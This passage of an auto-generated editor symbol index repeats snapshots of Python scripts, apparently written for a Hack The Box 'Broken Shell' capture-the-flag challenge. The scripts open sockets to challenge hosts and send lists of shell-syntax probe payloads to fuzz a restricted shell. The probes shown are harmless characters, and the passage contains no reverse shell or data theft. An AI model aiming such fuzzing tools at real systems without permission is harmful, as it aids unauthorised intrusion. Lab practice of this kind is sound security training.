        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042952",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044108",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517044829",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "peekOfCode": "def main():\n    tested_payloads = []\n    try:\n        with open(\"payloads/tested_payloads.json\", \"r\") as f:\n            tested_payloads = json.load(f)\n    except (FileNotFoundError, json.JSONDecodeError):\n        tested_payloads = [] # Start fresh if file doesn't exist or is invalid\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517051535",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "peekOfCode": "def main():\n    tested_payloads = []\n    try:\n        with open(\"payloads/tested_payloads.json\", \"r\") as f:\n            tested_payloads = json.load(f)\n    except (FileNotFoundError, json.JSONDecodeError):\n        tested_payloads = [] # Start fresh if file doesn't exist or is invalid\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517052641",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "peekOfCode": "def main():\n    tested_payloads = []\n    try:\n        with open(\"payloads/tested_payloads.json\", \"r\") as f:\n            tested_payloads = json.load(f)\n    except (FileNotFoundError, json.JSONDecodeError):\n        tested_payloads = [] # Start fresh if file doesn't exist or is invalid\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517110405",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "peekOfCode": "def main():\n    tested_payloads = []\n    try:\n        with open(\"payloads/tested_payloads.json\", \"r\") as f:\n            tested_payloads = json.load(f)\n    except (FileNotFoundError, json.JSONDecodeError):\n        tested_payloads = [] # Start fresh if file doesn't exist or is invalid\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "peekOfCode": "HOST = \"83.136.249.246\"\nPORT = 53928\nTIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "peekOfCode": "PORT = 53928\nTIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\ndef recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517110909",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517143818",
        "description": ".history.payloads.test_payloads_20250517143818",
        "peekOfCode": "HOST = '83.136.252.13'\nPORT = 39615\n# Read payloads from file\nwith open('payloads.txt', 'r') as f:\n    payloads = [line.strip() for line in f if line.strip()]\n# Create a TCP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections\nfor i, payload in enumerate(payloads):\n    try:",
        "detail": ".history.payloads.test_payloads_20250517143818",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517143818",
        "description": ".history.payloads.test_payloads_20250517143818",
        "peekOfCode": "PORT = 39615\n# Read payloads from file\nwith open('payloads.txt', 'r') as f:\n    payloads = [line.strip() for line in f if line.strip()]\n# Create a TCP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections\nfor i, payload in enumerate(payloads):\n    try:\n        # Connect to server",
        "detail": ".history.payloads.test_payloads_20250517143818",
        "documentation": {}
    },
    {
        "label": "sock",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517143818",
        "description": ".history.payloads.test_payloads_20250517143818",
        "peekOfCode": "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections\nfor i, payload in enumerate(payloads):\n    try:\n        # Connect to server\n        sock.connect((HOST, PORT))\n        # Send payload\n        sock.sendall(payload.encode('utf-8'))\n        # Receive response\n        response = sock.recv(1024).decode('utf-8', errors='ignore')",
        "detail": ".history.payloads.test_payloads_20250517143818",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144457",
        "description": ".history.payloads.test_payloads_20250517144457",
        "peekOfCode": "HOST = '83.136.252.13'\nPORT = 39615\n# Read payloads from file\nwith open('payloads.json', 'r') as f:\n    payloads = json.load(f)\n# Add \"tested\" key to each payload\nfor payload in payloads:\n    if isinstance(payload, str):\n        payload = {\"payload\": payload, \"tested\": False}\n    payload[\"tested\"] = False",
        "detail": ".history.payloads.test_payloads_20250517144457",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.payloads.test_payloads_20250517144457",
        "description": ".history.payloads.test_payloads_20250517144457",
